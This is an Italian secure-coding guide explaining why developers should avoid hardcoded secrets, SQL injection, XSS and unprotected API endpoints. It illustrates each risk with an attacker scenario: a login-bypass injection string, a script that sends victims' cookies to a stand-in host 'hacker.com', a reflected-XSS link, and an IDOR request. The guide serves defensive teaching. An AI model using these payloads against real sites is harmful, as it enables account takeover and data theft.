# Spiegazione delle Linee Guida di Sicurezza VibeCoding: Perché Insistiamo Tanto?

Questo documento spiega l'importanza di ogni regola nelle "Linee Guida di Sicurezza". Comprendere questo vi aiuterà a vedere il vostro codice dalla "prospettiva di un hacker" e prevenire problemi prima che si verifichino.

---

## ⭐ Regole Fondamentali

### 【Mai hardcodare i segreti】 & 【Utilizzare variabili d'ambiente】 & 【Ignorare file segreti】

**Perché è importante?**

Queste tre regole sono le leggi supreme di sopravvivenza del mondo digitale. Il vostro codice (specialmente quando si usa Git) verrà copiato, condiviso e archiviato in molti posti. Scrivere password, chiavi API e altri "segreti" direttamente nel codice è come tatuarsi la password della cassaforte sulla fronte - chiunque vi veda (veda il codice) può facilmente aprire la vostra cassaforte.

**Scenario dell'Hacker 😈**
> Adoro cercare `password`, `api_key` o `db_connect` su GitHub. Ho trovato il vostro progetto pubblico e in un file chiamato `config.js` ho visto questo codice: `const db_password = 'Password123!';`. Perfetto! Non ho nemmeno bisogno di attaccare il vostro sito - ora posso provare a connettermi direttamente al vostro database con questa password.

**Conseguenze Catastrofiche 💥**

**Controllo completo del servizio.** Gli hacker possono rubare, alterare, eliminare tutti i dati dei vostri utenti, o utilizzare i vostri servizi API a pagamento per attività illegali, con tutte le fatture a vostro carico.

---

## 📥 Gestione Input Utente

### 【Prevenire Attacchi SQL Injection】

**Perché è importante?**

Immaginate il database come un robot che capisce solo il linguaggio SQL. Se concatenate direttamente l'input utente con i vostri comandi, gli utenti hanno l'opportunità di pronunciare i propri "comandi". Le query parametrizzate dicono al robot: "Ascolta, la parte seguente sono **solo dati** - qualunque cosa contenga, non eseguirla come comandi."

**Scenario dell'Hacker 😈**
> Nel campo login del vostro sito, ho inserito `' OR '1'='1' --` come username. Suppongo che la vostra query SQL sia scritta così: `"SELECT * FROM users WHERE username = '" + userInput + "';`. Il mio input l'ha trasformata in `SELECT * FROM users WHERE username = '' OR '1'='1' --';`. `'1'='1'` è sempre vero, quindi ho bypassato la verifica password e ho fatto login con successo nel primo account utente (solitamente l'amministratore).

**Conseguenze Catastrofiche 💥**

Gli attaccanti possono bypassare il login, rubare tutti i dati del database (liste utenti, hash password), o persino eliminare il database.

### 【Prevenire Attacchi Cross-Site Scripting (XSS)】

**Perché è importante?**

Se il vostro sito web è come uno specchio che riflette direttamente il contenuto dell'input utente, allora gli utenti possono incorporare script JavaScript malevoli nel contenuto. Quando altri utenti navigano questo contenuto, lo script malevolo si eseguirà nei loro browser, rubando le loro informazioni. La codifica delle entità HTML converte caratteri speciali negli script malevoli (come `<`, `>`) in testo normale innocuo, rendendoli non eseguibili.

**Scenario dell'Hacker 😈**
> Ho lasciato un commento nella sezione commenti del vostro articolo: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Questo testo è stato salvato nel database così com'è. Ora qualsiasi utente che legge questo commento avrà il suo browser che esegue automaticamente questo script, inviando i suoi cookie di login al mio server. Con i cookie, posso impersonare la loro identità per accedere al sito web.

**Metodo di Attacco Avanzato: Come Può il Codice dell'Utente A Rubare i Dati dell'Utente B?**

Molte persone si chiedono: "L'attaccante non ha modificato il mio sito web, quindi come può rubare i dati di altri utenti?" Lasciate che lo spieghi con un esempio completo:

1. **L'attaccante A crea un link malevolo**
   ```
   https://yoursite.com/detail.php?id=1<script>steal()</script>
   ```

2. **L'attaccante inganna la vittima B attraverso social engineering**
   - Email: "Guardate il fantastico lavoro di questo fotografo!"
   - Post sui social media, commenti su forum, ecc.

3. **Cosa succede quando la vittima B clicca sul link?**
   ```php
   // Il vostro codice (vulnerabile)
   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
   
   // Output effettivo al browser di B
   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
   ```

4. **Perché possono rubare i dati di B?**
   - B è già autenticato sul vostro sito web
   - Lo script malevolo gira sotto **il vostro dominio**, quindi può:
     - Leggere i cookie di B (credenziali di login)
     - Accedere al localStorage di B
     - Fare richieste a nome di B
     - Modificare il contenuto della pagina (es: form di login falsi)

**Analogia Semplice**
Immaginate che il vostro sito web sia una banca:
- L'attaccante A piazza una "ricevuta di prelievo falsa" (script malevolo) nella hall della banca
- Il cliente B pensa che sia legittimo e inserisce la sua password
- A ottiene la password di B

XSS permette agli attaccanti di piazzare "ricevute di prelievo false" (codice malevolo) nella vostra "hall della banca" (sito web).

Ecco perché dovete usare `htmlspecialchars()` - garantisce che tutto l'input utente sia visualizzato come testo normale, non come codice eseguibile.

**Conseguenze Catastrofiche 💥**

Furto massivo di account utente, fuga di dati personali, siti web infiltrati con contenuti di phishing o script di mining.

---

## 🔐 Permessi e Autenticazione

### 【Protezione Endpoint API】

**Perché è importante?**

Le interfacce frontend (UI) possono nascondere bottoni, ma gli hacker non si fidano mai delle interfacce. Chiamano direttamente le vostre API backend con strumenti (come Postman, curl). Dovete assumere che ogni endpoint API verrà attaccato direttamente, quindi ogni endpoint deve essere una guardia indipendente, verificando autonomamente l'identità e i permessi dei visitatori.

**Scenario dell'Hacker 😈**
> Ho scoperto che per modificare informazioni personali, il frontend invia una richiesta a `/api/user/update`. Anche se non posso vedere i bottoni di modifica di altre persone, suppongo che questa API distingua gli utenti tramite `userId`. Ho provato a inviare una richiesta a `/api/user/update?userId=1` (ID dell'amministratore) con i dati che volevo modificare. Mio Dio, il server non ha verificato se la richiesta proveniva da me personalmente e ha modificato con successo l'email dell'amministratore!

**Conseguenze Catastrofiche 💥**

Utenti ordinari possono alterare dati di altri utenti o persino amministratori, o eseguire permessi che non dovrebbero avere, causando caos sistemico.